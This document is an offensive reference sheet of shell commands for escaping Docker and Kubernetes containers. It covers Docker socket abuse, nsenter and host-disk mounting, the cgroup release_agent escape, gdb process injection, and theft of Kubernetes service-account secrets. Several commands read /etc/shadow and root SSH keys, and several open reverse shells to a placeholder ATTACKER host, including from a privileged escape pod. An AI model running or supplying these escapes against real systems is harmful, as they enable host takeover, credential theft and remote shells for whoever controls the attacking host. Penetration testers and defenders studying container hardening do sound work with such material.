# Container Breakout Reference

## Detection — Am I in a Container?

```bash
# Docker
[ -f /.dockerenv ] && echo "Docker"
grep -qE 'docker|containerd' /proc/1/cgroup && echo "Docker cgroup"

# Kubernetes
[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo "Kubernetes pod"
[ -n "$KUBERNETES_SERVICE_HOST" ] && echo "K8s env vars set"

# LXC
grep -q lxc /proc/1/cgroup && echo "LXC"

# General
[ "$(cat /proc/1/comm)" != "systemd" ] && echo "PID 1 is not systemd"
hostname | grep -qP '^[a-f0-9]{12}$' && echo "Container-like hostname"
```

---

## Docker Socket Mount

**Severity**: CRITICAL — full host compromise

```bash
# Check
ls -la /var/run/docker.sock

# Exploit with Docker CLI
docker run -v /:/host --rm -it alpine chroot /host bash

# Exploit with curl only
# List images
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool

# Create privileged container
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["/bin/sh","-c","chroot /host bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create

# Start it (use container ID from create response)
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<ID>/start

# Read host files directly
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/shadow"]}' \
  http://localhost/containers/<ID>/exec
```

## Privileged Container — nsenter

```bash
# Check if privileged
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link delete dummy0

# Escape to host
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

## Privileged Container — Mount Host Disk

```bash
# Find host disk
fdisk -l 2>/dev/null || cat /proc/partitions

# Mount and chroot
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash

# Or just read sensitive files
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa
```

## CAP_SYS_ADMIN — Cgroup Escape (notify_on_release)

```bash
# Works when container has CAP_SYS_ADMIN but is not fully privileged
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/escape
echo 1 > $d/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

# Write payload
cat > /cmd << 'EOF'
#!/bin/sh
# Read sensitive files
cat /etc/shadow > /tmp/escape_shadow
cat /root/.ssh/id_rsa > /tmp/escape_key 2>/dev/null
# Or: reverse shell
# bash -i >& /dev/tcp/ATTACKER/4444 0>&1
EOF
chmod a+x /cmd

# Trigger escape
sh -c "echo 0 > $d/escape/cgroup.procs"
sleep 1

# Retrieve output (mapped to container path)
cat "$host_path/tmp/escape_shadow" 2>/dev/null || echo "Check /tmp/escape_shadow on host"
```

## CAP_SYS_PTRACE — Process Injection

```bash
# If container shares host PID namespace
# Find a root process on the host
ps aux | grep -v '^$(whoami)' | head -20

# Inject with gdb
gdb -p <HOST_ROOT_PID> -batch \
  -ex 'call (int)system("bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\" &")' \
  -ex detach -ex quit

# Or inject shellcode via /proc/PID/mem
python3 -c '
import ctypes
# ... shellcode injection via ptrace
'
```

## CAP_NET_ADMIN — Network Attacks

```bash
# ARP spoof / packet capture from container
tcpdump -i eth0 -w /tmp/capture.pcap

# If container shares host network namespace:
# Full network access to host services on 127.0.0.1
curl http://127.0.0.1:8080  # host services
```

## Host Network Namespace

```bash
# Check
cat /proc/1/net/tcp  # if shows host connections, shared namespace

# Access host-only services
curl http://127.0.0.1:8500    # Consul
curl http://127.0.0.1:2379    # etcd
curl http://127.0.0.1:10250   # Kubelet API
```

---

## Kubernetes Pod Escape

### Service Account Token Exploitation

```bash
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
export NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
export API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Check permissions
curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
  "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}"

# List secrets
curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces/$NS/secrets"

# Create privileged pod (if allowed)
curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
  -X POST -H "Content-Type: application/json" \
  "$API/api/v1/namespaces/$NS/pods" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
      "containers": [{
        "name": "escape",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "chroot /host bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\""],
        "volumeMounts": [{"name": "host", "mountPath": "/host"}],
        "securityContext": {"privileged": true}
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
      "hostNetwork": true,
      "hostPID": true
    }
  }'
```

### Node Access via Kubelet API

```bash
# If you can reach kubelet (port 10250)
curl -sk https://<NODE_IP>:10250/pods
curl -sk https://<NODE_IP>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
```

---

## containerd / CRI-O Specific

```bash
# containerd socket
ls -la /run/containerd/containerd.sock
# Use ctr tool if available
ctr -a /run/containerd/containerd.sock containers list

# CRI-O socket
ls -la /var/run/crio/crio.sock
```
